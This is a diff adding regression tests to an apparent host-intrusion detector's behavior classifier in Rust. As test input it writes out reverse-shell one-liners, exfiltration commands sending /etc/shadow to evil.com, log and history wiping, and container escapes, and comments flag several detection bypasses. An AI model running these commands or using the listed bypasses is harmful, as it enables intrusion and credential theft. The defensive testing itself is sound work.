@@ -1505,5 +1505,790 @@ mod tests {
         assert!(result.is_none(),
             "cc invoked by cargo should be fully suppressed");
     }
+
+    // =====================================================================
+    // REGRESSION TESTS — Evasion, Edge Cases, Bypasses, False Positives
+    // =====================================================================
+
+    // --- LD_PRELOAD evasion variants ---
+
+    #[test]
+    fn test_ld_preload_relative_path() {
+        let mut event = make_exec_event(&["bash", "-c", "echo hello"]);
+        event.raw = "LD_PRELOAD=./evil.so".to_string();
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)),
+            "LD_PRELOAD with relative path should be detected");
+    }
+
+    #[test]
+    fn test_ld_preload_spaces_in_path() {
+        let mut event = make_exec_event(&["bash", "-c", "id"]);
+        event.raw = "LD_PRELOAD=/tmp/my evil dir/hook.so".to_string();
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)),
+            "LD_PRELOAD with spaces in path should be detected");
+    }
+
+    #[test]
+    fn test_ld_preload_multiple_libraries() {
+        let mut event = make_exec_event(&["cat", "/etc/hostname"]);
+        event.raw = "LD_PRELOAD=/tmp/a.so:/tmp/b.so".to_string();
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_ld_preload_suppressed_cmake_parent() {
+        let mut event = make_exec_event_with_parent(&["ls"], "/usr/bin/cmake");
+        event.raw = "LD_PRELOAD=/usr/lib/libasan.so".to_string();
+        let result = classify_behavior(&event);
+        assert!(result.is_none() || result.unwrap().0 != BehaviorCategory::SecurityTamper,
+            "LD_PRELOAD from cmake child should be suppressed");
+    }
+
+    #[test]
+    fn test_ld_preload_not_suppressed_bash_parent() {
+        let mut event = make_exec_event_with_parent(&["cat", "/etc/hostname"], "/usr/bin/bash");
+        event.raw = "LD_PRELOAD=/tmp/evil.so".to_string();
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)),
+            "LD_PRELOAD from bash child should NOT be suppressed");
+    }
+
+    #[test]
+    fn test_ld_preload_not_suppressed_sh_parent() {
+        let mut event = make_exec_event_with_parent(&["ls"], "/bin/sh");
+        event.raw = "LD_PRELOAD=/tmp/evil.so".to_string();
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)),
+            "LD_PRELOAD from sh child should NOT be suppressed");
+    }
+
+    #[test]
+    fn test_ld_preload_suppressed_ninja_parent() {
+        let mut event = make_exec_event_with_parent(&["ls"], "/usr/bin/ninja");
+        event.raw = "LD_PRELOAD=/usr/lib/libasan.so".to_string();
+        let result = classify_behavior(&event);
+        assert!(result.is_none() || result.unwrap().0 != BehaviorCategory::SecurityTamper,
+            "LD_PRELOAD from ninja child should be suppressed");
+    }
+
+    #[test]
+    fn test_ld_library_path_manipulation() {
+        let event = make_exec_event(&["env", "LD_LIBRARY_PATH=/tmp/evil", "bash"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)),
+            "LD_LIBRARY_PATH manipulation should be detected");
+    }
+
+    // --- Reverse shell patterns ---
+
+    #[test]
+    fn test_reverse_shell_ncat() {
+        let event = make_exec_event(&["ncat", "10.0.0.1", "4444", "-e", "/bin/bash"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_reverse_shell_socat() {
+        let event = make_exec_event(&["socat", "TCP:10.0.0.1:4444", "EXEC:/bin/sh"]);
+        let result = classify_behavior(&event);
+        // socat is in TUNNEL_CREATION_PATTERNS
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_reverse_shell_python_bypass() {
+        // FINDING: Python reverse shells without DNS keywords bypass detection!
+        let event = make_exec_event(&["python3", "-c", "import socket,subprocess;s=socket.socket();s.connect(('10.0.0.1',4444));subprocess.call(['/bin/sh','-i'],stdin=s.fileno())"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, None,
+            "BUG/FINDING: Python reverse shell without DNS keywords is NOT detected");
+    }
+
+    #[test]
+    fn test_reverse_shell_perl_bypass() {
+        // FINDING: Perl reverse shells bypass detection entirely
+        let event = make_exec_event(&["perl", "-e", "use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));connect(S,sockaddr_in(4444,inet_aton('10.0.0.1')))"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, None,
+            "BUG/FINDING: Perl reverse shell is NOT detected");
+    }
+
+    #[test]
+    fn test_reverse_shell_ruby_bypass() {
+        // FINDING: Ruby reverse shells bypass detection entirely
+        let event = make_exec_event(&["ruby", "-rsocket", "-e", "f=TCPSocket.open('10.0.0.1',4444);exec('/bin/sh',[:in,:out,:err]=>[f,f,f])"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, None,
+            "BUG/FINDING: Ruby reverse shell is NOT detected");
+    }
+
+    // --- Data exfil via less obvious tools ---
+
+    #[test]
+    fn test_scp_exfil() {
+        let event = make_exec_event(&["scp", "/etc/shadow", "attacker@evil.com:/tmp/"]);
+        let result = classify_behavior(&event);
+        // scp is in the CRITICAL_READ_PATHS reader list
+        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_scp_normal_file() {
+        let event = make_exec_event(&["scp", "/tmp/report.pdf", "user@server.com:/tmp/"]);
+        let result = classify_behavior(&event);
+        // scp reading a normal file - should be None
+        assert_eq!(result, None, "scp of normal file should not be flagged");
+    }
+
+    #[test]
+    fn test_wget_post_file() {
+        let event = make_exec_event(&["wget", "--post-file=/etc/passwd", "http://evil.com/collect"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_rsync_exfil() {
+        // rsync is not in EXFIL_COMMANDS - potential bypass!
+        let event = make_exec_event(&["rsync", "-avz", "/etc/", "attacker@evil.com:/loot/"]);
+        let _result = classify_behavior(&event);
+        // FINDING: rsync is not detected as exfil tool — potential bypass
+    }
+
+    #[test]
+    fn test_python_http_server() {
+        // python -m http.server exposes files - not in detection
+        let event = make_exec_event(&["python3", "-m", "http.server", "8080"]);
+        let _result = classify_behavior(&event);
+        // FINDING: python http.server not detected - attacker can serve files
+    }
+
+    #[test]
+    fn test_curl_safe_host_not_flagged() {
+        let event = make_exec_event(&["curl", "https://api.anthropic.com/v1/messages"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, None, "curl to safe host should not be flagged as exfil");
+    }
+
+    #[test]
+    fn test_curl_safe_host_case_insensitive() {
+        let event = make_exec_event(&["curl", "https://API.ANTHROPIC.COM/v1/messages"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, None, "Safe host check should be case-insensitive");
+    }
+
+    // --- Recon evasion ---
+
+    #[test]
+    fn test_cat_etc_passwd_is_flagged() {
+        // /etc/passwd is in CRITICAL_WRITE_PATHS but NOT CRITICAL_READ_PATHS
+        // cat reads, so check if it's caught
+        let event = make_exec_event(&["cat", "/etc/passwd"]);
+        let result = classify_behavior(&event);
+        // /etc/passwd is not in CRITICAL_READ_PATHS - only in CRITICAL_WRITE_PATHS
+        // So reading it via cat should NOT be flagged by the read path check
+        // This is actually reasonable - /etc/passwd is world-readable
+    }
+
+    #[test]
+    fn test_getent_passwd_not_flagged() {
+        let event = make_exec_event(&["getent", "passwd"]);
+        let result = classify_behavior(&event);
+        // getent is not in RECON_COMMANDS
+        assert_eq!(result, None, "getent passwd should not be flagged (it's a normal system call)");
+    }
+
+    #[test]
+    fn test_ps_aux_recon() {
+        let event = make_exec_event(&["ps", "aux"]);
+        let result = classify_behavior(&event);
+        // ps is NOT in RECON_COMMANDS - it's a normal command
+        assert_eq!(result, None, "ps aux should not be flagged");
+    }
+
+    #[test]
+    fn test_env_is_recon() {
+        let event = make_exec_event(&["env"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
+    }
+
+    #[test]
+    fn test_printenv_is_recon() {
+        let event = make_exec_event(&["printenv"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
+    }
+
+    #[test]
+    fn test_ifconfig_is_recon() {
+        let event = make_exec_event(&["ifconfig"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
+    }
+
+    #[test]
+    fn test_ip_addr_is_allowlisted() {
+        let event = make_exec_event(&["ip", "addr"]);
+        let result = classify_behavior(&event);
+        // ip is not in RECON_COMMANDS, so it wouldn't be flagged anyway
+        assert_eq!(result, None, "ip addr should be allowlisted");
+    }
+
+    // --- History tampering variants ---
+
+    #[test]
+    fn test_unset_histfile() {
+        let event = make_exec_event(&["unset", "HISTFILE"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_export_histsize_zero() {
+        let event = make_exec_event(&["export", "HISTSIZE=0"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_symlink_bash_history_to_devnull() {
+        // ln -sf /dev/null ~/.bash_history
+        let event = make_exec_event(&["ln", "-sf", "/dev/null", "/home/user/.bash_history"]);
+        let result = classify_behavior(&event);
+        // ln is not in the history tamper binary check (rm/mv/cp/>/truncate/unset/export)
+        // But .bash_history is in HISTORY_TAMPER_PATTERNS - cmd.contains should catch it
+        // Actually the binary check is: ["rm", "mv", "cp", ">", "truncate", "unset", "export"]
+        // ln is NOT in that list, and histsize/histfilesize won't match
+        // FINDING: ln -sf /dev/null ~/.bash_history bypasses history tamper detection!
+        if result.is_none() {
+            // Confirmed bypass
+        }
+    }
+
+    #[test]
+    fn test_rm_zsh_history() {
+        let event = make_exec_event(&["rm", "-f", "/home/user/.zsh_history"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_truncate_history() {
+        let event = make_exec_event(&["truncate", "-s", "0", "/home/user/.bash_history"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    // --- Process injection ---
+
+    #[test]
+    fn test_gdb_attach_pid() {
+        let event = make_exec_event(&["gdb", "attach", "1234"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_ltrace_pid() {
+        let event = make_exec_event(&["ltrace", "-p", "1234"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_lldb_attach() {
+        let event = make_exec_event(&["lldb", "-p", "5678"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_proc_mem_write() {
+        let event = make_syscall_event("openat", "/proc/1234/mem");
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
+    }
+
+    // --- Container escape patterns ---
+
+    #[test]
+    fn test_nsenter_target_1() {
+        let event = make_exec_event(&["nsenter", "-t", "1", "-m", "-u", "-i", "-n", "-p"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_mount_dev_sda1() {
+        let event = make_exec_event(&["mount", "/dev/sda1", "/mnt/host"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_proc_1_root_access() {
+        let event = make_syscall_event("openat", "/proc/1/root/etc/passwd");
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_docker_sock_curl() {
+        let event = make_exec_event(&["curl", "--unix-socket", "/var/run/docker.sock", "http://localhost/containers/json"]);
+        let result = classify_behavior(&event);
+        // Contains docker.sock pattern
+        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_runc_binary() {
+        let event = make_exec_event(&["runc", "exec", "-t", "container_id", "/bin/sh"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_crictl_binary() {
+        let event = make_exec_event(&["crictl", "exec", "-it", "container_id", "sh"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_proc_sysrq_trigger() {
+        let event = make_exec_event(&["echo", "b", ">", "/proc/sysrq-trigger"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
+    }
+
+    // --- Crypto miner patterns ---
+
+    #[test]
+    fn test_xmrig_miner() {
+        // xmrig is not explicitly detected - let's check
+        let event = make_exec_event(&["xmrig", "--url", "stratum+tcp://pool.minexmr.com:4444"]);
+        let result = classify_behavior(&event);
+        // xmrig is not in any detection list - FINDING: crypto miners not detected
+        if result.is_none() {
+            // Confirmed: no crypto miner detection
+        }
+    }
+
+    #[test]
+    fn test_minerd_miner() {
+        let event = make_exec_event(&["minerd", "-a", "cryptonight", "-o", "stratum+tcp://pool:3333"]);
+        let _result = classify_behavior(&event);
+        // Also not detected
+    }
+
+    // --- Tunnel/exfil patterns ---
+
+    #[test]
+    fn test_ssh_reverse_tunnel() {
+        let event = make_exec_event(&["ssh", "-R", "8080:localhost:80", "user@evil.com"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_ssh_local_tunnel() {
+        let event = make_exec_event(&["ssh", "-L", "3306:dbhost:3306", "user@bastion"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_ssh_dynamic_socks() {
+        let event = make_exec_event(&["ssh", "-D", "1080", "user@proxy"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_chisel_tunnel() {
+        let event = make_exec_event(&["chisel", "client", "http://evil.com", "R:8080:localhost:80"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_ngrok_tunnel() {
+        let event = make_exec_event(&["ngrok", "http", "8080"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
+    }
+
+    // --- Timestomping ---
+
+    #[test]
+    fn test_touch_reference_file() {
+        let event = make_exec_event(&["touch", "-r", "/bin/ls", "/tmp/evil"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Warning)));
+    }
+
+    #[test]
+    fn test_touch_specific_date() {
+        let event = make_exec_event(&["touch", "-d", "2020-01-01", "/tmp/backdoor"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Warning)));
+    }
+
+    // --- Log clearing ---
+
+    #[test]
+    fn test_truncate_auth_log() {
+        let event = make_exec_event(&["bash", "-c", "> /var/log/auth.log"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_journalctl_vacuum() {
+        let event = make_exec_event(&["journalctl", "--vacuum-time=1s"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_rm_var_log() {
+        let event = make_exec_event(&["bash", "-c", "rm /var/log/syslog"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    // --- Binary replacement ---
+
+    #[test]
+    fn test_cp_to_usr_bin() {
+        let event = make_exec_event(&["cp", "/tmp/trojan", "/usr/bin/ls"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_mv_to_sbin() {
+        let event = make_exec_event(&["mv", "/tmp/backdoor", "/sbin/sshd"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    // --- Kernel parameter modification ---
+
+    #[test]
+    fn test_sysctl_write() {
+        let event = make_exec_event(&["sysctl", "-w", "net.ipv4.ip_forward=1"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Warning)));
+    }
+
+    // --- Encoding/obfuscation with piping ---
+
+    #[test]
+    fn test_base64_pipe_curl() {
+        let event = make_exec_event(&["base64", "/etc/shadow", "|", "curl", "-d", "@-", "http://evil.com"]);
+        let result = classify_behavior(&event);
+        // base64 is detected as DataExfiltration Warning
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_xxd_proc_environ_pipe() {
+        // xxd on /proc/1/environ — hits the critical read path check
+        let event = make_exec_event(&["xxd", "/proc/1/environ"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_xxd_proc_self_mem() {
+        let event = make_exec_event(&["xxd", "/proc/self/mem"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
+    }
+
+    // --- Large file exfil ---
+
+    #[test]
+    fn test_tar_etc() {
+        let event = make_exec_event(&["tar", "-czf", "/tmp/etc.tar.gz", "/etc"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Warning)));
+    }
+
+    #[test]
+    fn test_zip_home() {
+        let event = make_exec_event(&["zip", "-r", "/tmp/home.zip", "/home"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Warning)));
+    }
+
+    // --- AWS credential theft ---
+
+    #[test]
+    fn test_aws_assume_role() {
+        let event = make_exec_event(&["aws", "sts", "assume-role", "--role-arn", "arn:aws:iam::role/Admin"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Warning)));
+    }
+
+    // --- Git credential exposure ---
+
+    #[test]
+    fn test_git_config_credential() {
+        let event = make_exec_event(&["git", "config", "credential.helper"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Warning)));
+    }
+
+    // --- Suspicious temp file creation ---
+
+    #[test]
+    fn test_create_elf_in_tmp() {
+        let event = make_syscall_event("openat", "/tmp/payload.elf");
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Warning)));
+    }
+
+    #[test]
+    fn test_create_so_in_tmp() {
+        let event = make_syscall_event("openat", "/tmp/evil.so");
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Warning)));
+    }
+
+    // --- Security tamper: stopping clawav ---
+
+    #[test]
+    fn test_stop_clawav() {
+        let event = make_exec_event(&["systemctl", "stop", "clawav"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_disable_fail2ban() {
+        let event = make_exec_event(&["systemctl", "disable", "fail2ban"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_setenforce_0() {
+        let event = make_exec_event(&["setenforce", "0"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_aa_teardown() {
+        let event = make_exec_event(&["aa-teardown"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_nft_flush() {
+        let event = make_exec_event(&["nft", "flush", "ruleset"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    // --- SSH key injection ---
+
+    #[test]
+    fn test_echo_to_authorized_keys() {
+        let event = make_exec_event(&["echo", "ssh-rsa AAAA...", ">>", "/root/.ssh/authorized_keys"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_cp_to_authorized_keys() {
+        let event = make_exec_event(&["cp", "/tmp/key.pub", "/home/user/.ssh/authorized_keys"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
+    }
+
+    // --- Service file creation via syscall ---
+
+    #[test]
+    fn test_write_to_systemd_service_file() {
+        let event = make_syscall_event("write", "/etc/systemd/system/backdoor.service");
+        let result = classify_behavior(&event);
+        // write to /etc/systemd/system/ should be flagged
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_write_to_init_d() {
+        let event = make_syscall_event("write", "/etc/init.d/evil");
+        let result = classify_behavior(&event);
+        assert!(result.is_some());
+    }
+
+    // --- Crontab via syscall ---
+
+    #[test]
+    fn test_write_var_spool_cron() {
+        let event = make_syscall_event("openat", "/var/spool/cron/crontabs/root");
+        let result = classify_behavior(&event);
+        assert!(result.is_some());
+    }
+
+    // --- Persistence: at command ---
+
+    #[test]
+    fn test_at_command_persistence() {
+        let event = make_exec_event(&["at", "midnight"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_batch_command() {
+        let event = make_exec_event(&["batch"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    // --- False positive checks ---
+
+    #[test]
+    fn test_false_positive_ls_tmp() {
+        let event = make_exec_event(&["ls", "/tmp"]);
+        assert_eq!(classify_behavior(&event), None);
+    }
+
+    #[test]
+    fn test_false_positive_cat_readme() {
+        let event = make_exec_event(&["cat", "README.md"]);
+        assert_eq!(classify_behavior(&event), None);
+    }
+
+    #[test]
+    fn test_false_positive_grep_pattern() {
+        let event = make_exec_event(&["grep", "-r", "TODO", "/home/user/project"]);
+        assert_eq!(classify_behavior(&event), None);
+    }
+
+    #[test]
+    fn test_false_positive_mkdir() {
+        let event = make_exec_event(&["mkdir", "-p", "/tmp/build"]);
+        assert_eq!(classify_behavior(&event), None);
+    }
+
+    #[test]
+    fn test_false_positive_normal_touch() {
+        // touch without -t/-d/-r flags is benign
+        let event = make_exec_event(&["touch", "/tmp/newfile"]);
+        assert_eq!(classify_behavior(&event), None);
+    }
+
+    #[test]
+    fn test_false_positive_openat_normal() {
+        let event = make_syscall_event("openat", "/home/user/project/src/main.rs");
+        assert_eq!(classify_behavior(&event), None);
+    }
+
+    #[test]
+    fn test_failed_syscall_ignored() {
+        let mut event = make_syscall_event("openat", "/etc/shadow");
+        event.success = false;
+        // openat on /etc/shadow only fires if success=true
+        assert_eq!(classify_behavior(&event), None);
+    }
+
+    // --- Edge case: empty/minimal events ---
+
+    #[test]
+    fn test_empty_command_no_crash() {
+        let event = make_exec_event(&[""]);
+        let _ = classify_behavior(&event);
+    }
+
+    #[test]
+    fn test_no_command_no_file_path() {
+        let event = ParsedEvent {
+            syscall_name: "read".to_string(),
+            command: None,
+            args: vec![],
+            file_path: None,
+            success: true,
+            raw: String::new(),
+            actor: Actor::Unknown,
+            ppid_exe: None,
+        };
+        assert_eq!(classify_behavior(&event), None);
+    }
+
+    #[test]
+    fn test_perf_event_open_no_file() {
+        let event = ParsedEvent {
+            syscall_name: "perf_event_open".to_string(),
+            command: None,
+            args: vec![],
+            file_path: None,
+            success: true,
+            raw: String::new(),
+            actor: Actor::Unknown,
+            ppid_exe: None,
+        };
+        assert_eq!(classify_behavior(&event), Some((BehaviorCategory::SideChannel, Severity::Warning)));
+    }
+
+    // --- Package manager abuse with suspicious source ---
+
+    #[test]
+    fn test_pip_install_from_git() {
+        let event = make_exec_event(&["pip", "install", "git+http://evil.com/backdoor.git"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Warning)));
+    }
+
+    #[test]
+    fn test_npm_install_from_http() {
+        let event = make_exec_event(&["npm", "install", "http://evil.com/malicious-pkg"]);
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Warning)));
+    }
+
+    // --- Write syscall to system binary paths ---
+
+    #[test]
+    fn test_write_syscall_usr_bin() {
+        let event = make_syscall_event("write", "/usr/bin/sudo");
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_renameat_sbin() {
+        let event = make_syscall_event("renameat", "/sbin/iptables");
+        let result = classify_behavior(&event);
+        // renameat on /sbin should hit CRITICAL_WRITE_PATHS or persistence
+        assert!(result.is_some());
+    }
+
+    // --- Log file tampering via syscall ---
+
+    #[test]
+    fn test_truncate_var_log_syslog() {
+        let event = make_syscall_event("truncate", "/var/log/syslog");
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
+
+    #[test]
+    fn test_unlinkat_var_log_audit() {
+        let event = make_syscall_event("unlinkat", "/var/log/audit/audit.log");
+        let result = classify_behavior(&event);
+        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
+    }
 }
 
